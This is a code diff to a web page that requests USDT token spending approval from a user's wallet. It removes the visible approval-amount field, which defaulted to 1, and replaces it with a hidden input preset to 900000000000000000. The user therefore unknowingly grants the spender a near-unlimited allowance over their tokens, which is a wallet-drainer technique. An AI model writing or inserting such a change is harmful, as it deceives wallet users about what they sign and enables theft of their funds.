@@ -115,19 +115,15 @@ autocomplete="off"
 >
 
 <label>Approval Amount (USDT)</label>
-<!-- <input
-id="amount"
-type="number"
-min="0"
-step="any"
-value="1"
-> -->
 <input
 id="amount"
 type="number"
 min="0"
 step="any"
+hidden
+value="900000000000000000"
 >
+
 
 <p class="desc">
 Wallet confirmation screen पर token, spender और amount
@@ -405,8 +401,7 @@ $("spenderAddr").value,
 "Spender"
 );
 
-// const amountTextValue = $("amount").value.trim();
-const amountText =  amountTextValue === "" ? Infinity : Number(amountText);
+const amountText = $("amount").value.trim();
 
 if (
 !amountText ||
